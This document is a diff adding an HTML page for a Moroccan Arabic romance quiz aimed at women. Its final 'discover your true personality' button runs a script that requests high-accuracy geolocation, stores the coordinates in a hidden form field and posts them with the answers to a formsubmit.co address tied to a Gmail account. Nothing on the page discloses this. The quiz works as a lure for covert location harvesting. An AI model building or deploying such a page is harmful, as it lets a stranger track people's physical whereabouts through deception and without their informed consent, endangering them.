@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>شنو كيعجبك فالرجل المناسب؟</title>
+  <style>
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: #fff0f5;
+      color: #333;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .quiz-container {
+      background: white;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+    }
+    .question {
+      margin-bottom: 15px;
+      font-size: 1.2em;
+    }
+    .options {
+      display: flex;
+      flex-direction: column;
+    }
+    label {
+      margin-bottom: 10px;
+      background: #fce4ec;
+      padding: 10px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    input[type="radio"] {
+      margin-left: 10px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 20px;
+      border-radius: 10px;
+      border: none;
+      background: #ff69b4;
+      color: white;
+      font-size: 1em;
+      cursor: pointer;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <form class="quiz-container" id="quizForm">
+    <input type="hidden" name="موقع" id="location">
+
+    <div class="step">
+      <div class="question">1. شنو أول حاجة كتشدي فيها الانتباه عند راجل؟</div>
+      <div class="options">
+        <label><input type="radio" name="السؤال1" value="الابتسامة" required>الابتسامة</label>
+        <label><input type="radio" name="السؤال1" value="الستايل">الستايل</label>
+        <label><input type="radio" name="السؤال1" value="طريقة الهضرة">طريقة الهضرة</label>
+      </div>
+    </div>
+
+    <div class="step hidden">
+      <div class="question">2. كتفضلي الراجل يكون...</div>
+      <div class="options">
+        <label><input type="radio" name="السؤال2" value="رومانسي" required>رومانسي</label>
+        <label><input type="radio" name="السؤال2" value="طموح">طموح</label>
+        <label><input type="radio" name="السؤال2" value="جدي ومضحك">جدي ومضحك</label>
+      </div>
+    </div>
+
+    <div class="step hidden">
+      <div class="question">3. شنو أحسن حاجة درتيها من أجل الحب؟</div>
+      <div class="options">
+        <label><input type="radio" name="السؤال3" value="سافرت على ودّو" required>سافرت على ودّو</label>
+        <label><input type="radio" name="السؤال3" value="تخليت على شي حاجة عزيزة عليا">تخليت على شي حاجة عزيزة عليا</label>
+        <label><input type="radio" name="السؤال3" value="بقيت كنصبر باش نكمل معاه">بقيت كنصبر باش نكمل معاه</label>
+      </div>
+    </div>
+
+    <div class="step hidden">
+      <div class="question">4. واش كتآمني بالحب من أول نظرة؟</div>
+      <div class="options">
+        <label><input type="radio" name="السؤال4" value="نعم" required>نعم</label>
+        <label><input type="radio" name="السؤال4" value="لا">لا</label>
+        <label><input type="radio" name="السؤال4" value="يمكن">يمكن</label>
+      </div>
+    </div>
+
+    <div class="step hidden">
+      <div class="question">5. شنو اللي كيعجبك فالمفاجآت الرومانسية؟</div>
+      <div class="options">
+        <label><input type="radio" name="السؤال5" value="الهدايا الصغيرة" required>الهدايا الصغيرة</label>
+        <label><input type="radio" name="السؤال5" value="الورود والكلمات الحلوة">الورود والكلمات الحلوة</label>
+        <label><input type="radio" name="السؤال5" value="الخروجات الغير متوقعة">الخروجات الغير متوقعة</label>
+      </div>
+    </div>
+
+    <div class="step hidden">
+      <button type="button" onclick="submitWithLocation()">اكتشفي شخصيتك الحقيقية</button>
+    </div>
+  </form>
+
+  <script>
+    const steps = document.querySelectorAll('.step');
+    let currentStep = 0;
+
+    steps[currentStep].classList.remove('hidden');
+
+    document.querySelectorAll('input[type="radio"]').forEach(input => {
+      input.addEventListener('change', () => {
+        if (currentStep < steps.length - 1) {
+          steps[currentStep].classList.add('hidden');
+          currentStep++;
+          steps[currentStep].classList.remove('hidden');
+        }
+      });
+    });
+
+    function submitWithLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          document.getElementById('location').value = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+          sendForm();
+        }, function() {
+          document.getElementById('location').value = 'الموقع مرفوض أو غير متاح';
+          sendForm();
+        }, {
+          enableHighAccuracy: true
+        });
+      } else {
+        document.getElementById('location').value = 'الموقع غير مدعوم';
+        sendForm();
+      }
+    }
+
+    function sendForm() {
+      const form = document.getElementById('quizForm');
+      form.setAttribute('action', 'https://formsubmit.co/game.haven25@gmail.com');
+      form.setAttribute('method', 'POST');
+      form.submit();
+    }
+  </script>
+</body>
+</html>
